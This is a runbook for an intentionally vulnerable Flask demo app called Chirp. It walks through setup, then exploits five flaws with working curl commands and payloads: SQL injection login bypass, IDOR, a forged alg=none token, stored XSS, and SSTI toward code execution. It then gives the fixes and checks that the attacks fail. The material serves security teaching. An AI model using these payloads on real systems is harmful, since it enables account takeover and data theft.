# Chirp — Complete Runbook

Everything you need to do, in order, from a fresh clone to a working demo:
install the prerequisites, run the vulnerable app, exploit all five
vulnerabilities, then fix and re-verify them.

> ⚠️ **Do this on an isolated machine, offline, on localhost only.** Chirp is
> intentionally insecure. `app.py` even runs with `debug=True`, which exposes a
> Werkzeug debugger. Never expose it to a network, never use real credentials,
> and only attack systems you own or are authorized to test.

This runbook is verified on **Windows (Git Bash)** and applies to **macOS/Linux**
with the noted command differences. All commands were checked against a fresh
clone of the repo.

---

## 0. The whole flow at a glance

```
clone → virtualenv → install deps → seed db → run app → exploit (V1..V5)
                                                   └→ run fixed app → re-exploit (should fail)
                                                   └→ python verify_demo.py
```

---

## 1. Prerequisites

| Tool | Why you need it | Check it | Minimum |
|------|-----------------|----------|---------|
| **Git** | Clone the repo | `git --version` | any recent |
| **Python** | Runs the app | `python3 --version` *or* `python --version` | **3.9+** (3.10–3.13 recommended) |
| **pip** | Installs Flask/Werkzeug | `python -m pip --version` | bundled with Python |
| **curl** | Runs the exploit commands | `curl --version` | any recent |
| **Web browser** | Sees the stored-XSS popup fire (V2) | — | any |
| **sqlite3 CLI** *(optional)* | Peek at the database | `sqlite3 --version` | any |
| **Free ports** *(optional)* | App uses 5000 / 5051 | — | 5000 & 5051 free |

**Why 3.9+?** `requirements.txt` pins `Flask>=3.1,<4` and `Werkzeug>=3.1,<4`,
which require Python 3.9 or newer.

### OS notes

- **Windows:** use **Git Bash** (installs with Git for Windows and includes
  `curl`). Virtualenv executables live under `.venv/Scripts/`.
- **⚠️ Windows gotcha:** bare `python3` sometimes points at the Microsoft Store
  stub and fails with *"Python was not found; run without arguments to install
  from the Microsoft Store."* If that happens, use `python` instead, or disable
  the alias under *Settings → Apps → Advanced app settings → App execution
  aliases*.
- **macOS / Linux:** use `python3`; virtualenv executables live under
  `.venv/bin/`.

---

## 2. Clone the repository

```bash
git clone https://github.com/parthpalav/chirp.git
cd chirp
```

If you already have the folder, just `cd` into it. **The application lives at
the repository root** (not in a subfolder).

---

## 3. Create and activate a virtual environment

Run this inside the repo root. Pick your OS:

**Windows (Git Bash):**

```bash
python -m venv .venv
source .venv/Scripts/activate
```

**macOS / Linux:**

```bash
python3 -m venv .venv
source .venv/bin/activate
```

Your prompt now shows `(.venv)`. *(If you skip activation, you can instead call
the interpreter explicitly — e.g. `.venv/Scripts/python.exe app.py` — but the
steps below assume the venv is active.)*

---

## 4. Install dependencies

```bash
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
```

`requirements.txt` contains:

```
Flask>=3.1,<4
Werkzeug>=3.1,<4
```

No Node.js, no frontend build step, and no font/CDN downloads are required —
everything else is bundled.

---

## 5. What is in the repo (so you know what to touch)

```
chirp/
  app.py            # the VULNERABLE app (each flaw marked with a V# comment)
  app_fixed.py      # the HARDENED app (the reference fix)
  seed.py           # builds/rebuilds the SQLite database
  verify_demo.py    # automated before/after check for all five
  chirp.db          # PREBUILT vulnerable DB committed to the repo
  requirements.txt  # Python dependencies
  templates/        # Jinja templates (base, index, profile, admin, login, ...)
  static/           # style.css, ui.js, icons, bundled IBM Plex fonts
  docs/
    VULNERABILITIES.md  # exploit walkthroughs (source for this runbook)
    PATCHES.md          # fixes (source for this runbook)
    DESIGN.md           # UI notes
    RUNBOOK.md          # this file
```

**Important:** `chirp.db` is committed to the repo, so it already exists when
you clone. That affects how you seed (next step).

---

## 6. Prepare the database

Because `chirp.db` already exists, plain `python seed.py` refuses to overwrite
it. Use `--reset` to rebuild it:

```bash
# Vulnerable database (plaintext passwords) → chirp.db
python seed.py --reset

# Hardened database (hashed passwords) → chirp_fixed.db  (needed for the fix demo)
python seed.py --fixed
```

Both print `Seeded <file> (users: admin / alice / bob)`.

**What gets seeded:**

- Users: `admin` / `S3cr3t_@dm1n_2026`, `alice` / `password123`,
  `bob` / `hunter2`.
- Some tweets.
- DMs, including one containing `FLAG{idor_lets_you_read_my_dms}`.

*(`chirp.db` is tracked by git; the vulnerable edition stores passwords in
plaintext. `chirp_fixed.db` is generated locally and is not committed.)*

---

## 7. Run the vulnerable target

In **Terminal A**:

```bash
python app.py
```

It serves **http://127.0.0.1:5000**. Open that in your browser to see the feed.

> `app.py` runs with `debug=True` on purpose (another teaching point — it
> exposes the Werkzeug debugger). Keep it on localhost.

Leave Terminal A running. Use **Terminal C** (below) for the attacks.

---

## 8. (Optional) Run the fixed target side by side

In **Terminal B**:

```bash
python app_fixed.py                 # http://127.0.0.1:5051
# or choose a different port:
python app_fixed.py --port 5060
```

`app_fixed.py` reads `CHIRP_SECRET_KEY` from the environment; if it is unset it
generates a random key each restart (so signing keys aren't committed).
It needs `chirp_fixed.db` — create it with `python seed.py --fixed` (step 6), or
it exits with *"No fixed database found."*

---

## 9. Automated check (optional, no server required)

In any terminal (venv active):

```bash
python verify_demo.py
```

It builds temporary databases, drives both apps with Flask's test client, and
prints a `PASS` line per vulnerability. On the vulnerable edition all five pass;
on the fixed edition V1/V3/V4 pass and the V5 HTML-escape check is compared the
wrong way (a **test bug**, see Troubleshooting).

---

## 10. Exploitation walkthrough — all five, step by step

Open **Terminal C** in the repo root (the same folder as `app.py`). Everything
below writes a **cookie jar `cj.txt`** and stores the **session cookie** in it.
Put `cj.txt` in the repo root so the relative paths work as written.

Set the target once:

```bash
BASE=http://127.0.0.1:5000
```

### V1 — SQL Injection → authentication bypass (`POST /login`)

**What to put where:** the username field gets `admin' --` (note the trailing
space then `--`); the password field can be anything. The `--` turns the rest
of the query into a comment, so the password check never runs.

```bash
curl -i -c cj.txt -d "username=admin' --&password=x" "$BASE/login"
```

Expected: `HTTP/1.1 302 FOUND` and a `Set-Cookie: session=...` header. The cookie
is saved into `cj.txt`.

**Confirm you are admin:**

```bash
curl -s -b cj.txt -o /dev/null -w "%{http_code}\n" "$BASE/admin"
# -> 200  (you are authenticated as admin, with no password)
```

### V3 — IDOR → read other users' DMs (`GET /api/dm/<id>`)

**What to put where:** just change the numeric id in the URL. Your session only
needs to be valid; it does not need to own the message.

```bash
curl -s -b cj.txt "$BASE/api/dm/2"
```

Expected JSON:

```json
{"from":"admin","id":2,"message":"FLAG{idor_lets_you_read_my_dms}","to":"alice"}
```

Try `/api/dm/1`, `/api/dm/3`, … to read every DM in the system.

### V4 — Broken auth, `alg=none` → forge the admin identity (`GET /admin`)

**What to put where:** build an unsigned token and place it in the `session`
cookie. The empty segment after the final dot is the missing signature.

```bash
FORGED=$(python - <<'PY'
import base64, json
b = lambda x: base64.urlsafe_b64encode(x).rstrip(b"=").decode()
h = b(json.dumps({"alg": "none", "typ": "CHIRP"}).encode())
p = b(json.dumps({"user": "admin"}).encode())
print(f"{h}.{p}.")
PY
)

curl -s -b "session=$FORGED" "$BASE/admin" | grep -o 'FLAG{alg_none_made_you_admin}'
```

Expected:

```
FLAG{alg_none_made_you_admin}
```

### V2 — Stored XSS → script runs for every visitor (tweet body)

**What to put where:** the tweet body. You can do it with curl or in the browser
composer on the home page while signed in.

```bash
curl -s -b cj.txt -d "body=<script>alert(document.cookie)</script>" "$BASE/tweet"
```

Then **open http://127.0.0.1:5000/ in your browser** — the alert fires and
`document.cookie` is readable. The same payload also fires on the author's
profile page. It is *stored* because it is saved in the database and served to
everyone who loads the feed.

### V5 — Server-Side Template Injection → RCE (profile bio)

**What to put where:** your profile **bio**, then view your profile page.

```bash
# Put the payload in the bio (needs a session — reuse cj.txt)
curl -s -b cj.txt --data-urlencode "bio={{7*7}}" "$BASE/settings" -o /dev/null

# View the profile; the expression has been evaluated server-side
curl -s -b cj.txt "$BASE/user/admin" | grep -o "bio'>49<"
# -> bio'>49<
```

**Proof of escalation to RCE.** Set the bio to these and re-view the profile:

```jinja
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

---

## 11. Remediation — apply the fixes

You have two paths. **Option A** is the quick demo; **Option B** is the
hands-on audit fix (edit the vulnerable files yourself).

### Option A — run the already-fixed app

```bash
python seed.py --fixed      # hashed passwords → chirp_fixed.db  (once)
python app_fixed.py         # http://127.0.0.1:5051
```

`app_fixed.py` is the reference implementation of every fix. Re-run the step-10
attacks against `:5051` and they all fail.

### Option B — edit the vulnerable files in place

Make these edits, then restart `app.py`. (Diff against `app_fixed.py` if unsure.)

**1. V1 — SQL injection.** In `app.py`, `login()`:

```python
# Before
query = ("SELECT * FROM users WHERE username = '%s' AND password = '%s'"
         % (username, password))
row = db.execute(query).fetchone()

# After — bind the username as data; verify the password hash separately
from werkzeug.security import check_password_hash
row = db.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()
if row and check_password_hash(row["password"], password):
    ...
```

*(Hashing only takes effect with `seed.py --fixed`; a plaintext `chirp.db`
still works if you compare the password directly, but hashing is the real fix.)*

**2. V2 — stored XSS.** In `templates/components.html`, the `post` macro:

```jinja
{# Before #}
<div class="post-body">{{ tweet['body'] | safe }}</div>
{# After — Jinja auto-escapes #}
<div class="post-body">{{ tweet['body'] }}</div>
```

**3. V3 — IDOR.** In `app.py`, `get_dm()`:

```python
# After — scope to the current user, 404 on a miss
dm = db.execute(
    "SELECT * FROM dms WHERE id = ? AND (sender = ? OR recipient = ?)",
    (dm_id, user["username"], user["username"]),
).fetchone()
if not dm:
    abort(404)
```

**4. V4 — broken auth.** In `app.py`, `verify_token()`: delete the
`if header.get("alg") == "none": return payload.get("user")` branch so a
signature is always required. Better: replace the hand-rolled tokens with
Flask sessions (`app_fixed.py` does this) or PyJWT with
`algorithms=["HS256"]`.

**5. V5 — SSTI.** In `app.py`, `profile()`: stop building a template from the
bio. Pass it as data:

```python
return render_template("profile.html", profile_user=row, bio=row["bio"] or "", ...)
```

and in `templates/profile.html` render `<div class="bio">{{ bio }}</div>`
(no `| safe`, no pre-rendered `bio_html`).

**6. General hardening** (from `docs/PATCHES.md`): set `debug=False`, add a
Content-Security-Policy, set cookies `HttpOnly`/`SameSite`, use a strong random
secret, hash passwords, and return `404` rather than `403` on authorization
misses.

---

## 12. Verify the fixes

Re-run the step-10 attacks against the fixed app (`BASE=http://127.0.0.1:5051`):

| Attack | Vulnerable (`:5000`) | Fixed (`:5051`) |
|--------|----------------------|-----------------|
| V1 `admin' --` login | `302` + session | `400` / no session |
| V3 `/api/dm/2` | `200` + flag | `401` signed-out / `404` for foreign DM |
| V4 forged `alg=none` token `/admin` | `200` + flag | `403` |
| V2 `<script>…` in feed | raw script executes | escaped as text |
| V5 bio `{{7*7}}` | renders `49` | renders literal `{{7*7}}` |

Then run the automated suite once more:

```bash
python verify_demo.py
```

---

## 13. Reset and clean up

Stop the servers with `Ctrl+C` in their terminals. Then:

```bash
python seed.py --reset      # fresh vulnerable DB  (or --fixed for the hardened one)
deactivate                  # leave the virtualenv
rm -f cj.txt                # remove the cookie jar
rm -rf .venv                # remove the virtualenv (optional)
```

Because `chirp.db` is tracked by git, re-seeding modifies it. To restore the
committed copy:

```bash
git checkout -- chirp.db
```

---

## 14. Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| `python3: command not found` / *"Python was not found… Microsoft Store"* | Windows Store alias stub | Use `python`, or disable App Execution Aliases |
| `ModuleNotFoundError: No module named 'flask'` | venv not active / deps not installed | `source .venv/Scripts/activate` then `pip install -r requirements.txt` |
| `seed.py` raises `FileExistsError: … already exists` | `chirp.db` is committed to the repo | Add `--reset` |
| `app_fixed.py`: *"No fixed database found"* | `chirp_fixed.db` missing | `python seed.py --fixed` |
| `Address already in use` on 5000/5051 | Another server is running | Stop it, or use `app_fixed.py --port <n>` |
| `curl: command not found` | curl not installed | Use Git Bash, or install curl |
| XSS payload shows as text in the feed | You are looking at the fixed app | Re-run against `:5000` |
| `verify_demo.py` → `AssertionError: Bio escaping` (fixed edition) | **Test bug:** compares Jinja's `&#34;` to Python `html.escape`'s `&quot;`. The fixed app *does* escape correctly. | Expected — not a vulnerability |
| `verify_demo.py` → `PermissionError [WinError 32]` at the end | Windows temp-dir cleanup races the still-open SQLite handle | Harmless; the checks already ran |
| Werkzeug prints two lines / restarts | `debug=True` reloader | Normal |
